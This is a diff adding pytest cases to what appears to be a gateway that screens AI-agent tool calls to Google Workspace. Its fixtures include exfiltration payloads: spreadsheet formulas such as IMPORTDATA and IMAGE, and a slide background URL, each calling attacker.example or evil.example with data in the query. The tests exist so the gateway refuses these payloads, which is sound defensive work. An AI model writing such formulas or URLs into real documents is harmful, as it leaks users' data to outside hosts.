@@ -241,3 +241,84 @@ def test_deeply_nested_attachments_refused_not_crashed() -> None:
                    {"to": ALICE, "subject": "s", "body": "b", "attachments": "[" * 100_000})
     assert session_call.await_count == 0
     assert "attachment" in json.loads(result)["error"].lower()
+
+
+# ---------------------------------------------------------------------------
+# Second review round: Google-side fetches by key suffix, scheme, and formula
+# ---------------------------------------------------------------------------
+
+
+def test_slide_background_content_url_refused() -> None:
+    gateway, session_call = _make_gateway()
+    result = _call(gateway, "google_workspace__batch_update_presentation", {
+        "presentation_id": "p",
+        "requests": [{"updatePageProperties": {"objectId": "s1", "pageProperties": {
+            "pageBackgroundFill": {"stretchedPictureFill":
+                                   {"contentUrl": "https://attacker.example/x.png?d=s"}}},
+            "fields": "pageBackgroundFill"}}],
+    })
+    assert session_call.await_count == 0
+    assert "fetch" in json.loads(result)["error"]
+
+
+@pytest.mark.parametrize("value", [
+    "https:evil.example/x.png", "HTTP://evil.example/x", " ftp://evil.example/x",
+    "data:image/png;base64,AAAA",
+])
+def test_any_url_scheme_counts(value: str) -> None:
+    gateway, session_call = _make_gateway()
+    result = _call(gateway, "google_workspace__batch_update_doc",
+                   {"document_id": "d", "operations": [{"type": "insert_image", "image_uri": value}]})
+    assert session_call.await_count == 0
+    assert "fetch" in json.loads(result)["error"]
+
+
+@pytest.mark.parametrize("key,value", [
+    ("link_url", "https://example.com/page"),      # a document hyperlink, stored
+    ("conference_uri", "https://meet.example/abc"),  # a meeting link, stored
+    ("youtube_uri", "https://youtu.be/x"),          # YouTube only
+    ("image_uri", "1AbCdEfDriveFileId"),           # a Drive id, no scheme
+])
+def test_stored_urls_and_drive_ids_pass(key: str, value: str) -> None:
+    gateway, session_call = _make_gateway()
+    _call(gateway, "google_workspace__some_tool", {"x": [{"nested": {key: value}}]})
+    assert session_call.await_count == 1
+
+
+@pytest.mark.parametrize("tool,arguments", [
+    ("google_workspace__modify_sheet_values",
+     {"spreadsheet_id": "s", "range_name": "A1", "values": [["=IMPORTDATA(\"https://evil.example/?d=s\")"]]}),
+    ("google_workspace__append_table_rows",
+     {"spreadsheet_id": "s", "table": "t", "rows": [{"c": "= importxml(\"https://evil.example\", \"//a\")"}]}),
+    ("google_workspace__modify_sheet_values",
+     {"spreadsheet_id": "s", "range_name": "A1", "values": [["=IMAGE(\"https://evil.example/?d=s\")"]]}),
+    ("google_workspace__create_table_with_data",
+     {"spreadsheet_id": "s", "data": [["h"], ["=IMPORTHTML(\"https://evil.example\",\"table\",1)"]]}),
+])
+def test_fetching_sheet_formulas_refused(tool: str, arguments: dict[str, Any]) -> None:
+    gateway, session_call = _make_gateway()
+    result = _call(gateway, tool, arguments)
+    assert session_call.await_count == 0
+    assert "formula" in json.loads(result)["error"]
+
+
+@pytest.mark.parametrize("cell", ["=SUM(A1:A5)", "IMPORTDATA is a function", "=HYPERLINK(\"https://x\",\"x\")", "plain"])
+def test_ordinary_cells_pass(cell: str) -> None:
+    gateway, session_call = _make_gateway()
+    _call(gateway, "google_workspace__modify_sheet_values",
+          {"spreadsheet_id": "s", "range_name": "A1", "values": [[cell]]})
+    assert session_call.await_count == 1
+
+
+def test_formula_text_in_a_doc_is_not_a_cell() -> None:
+    """The formula rule is for tools that write cells; a Doc stores text."""
+    gateway, session_call = _make_gateway()
+    _call(gateway, "google_workspace__modify_doc_text",
+          {"document_id": "d", "text": "=IMPORTDATA(\"https://example.com\") is dangerous"})
+    assert session_call.await_count == 1
+
+
+def test_deeply_nested_string_arguments_do_not_crash() -> None:
+    gateway, _session_call = _make_gateway()
+    result = _call(gateway, "google_workspace__get_events", "[" * 100_000)
+    assert isinstance(result, str)
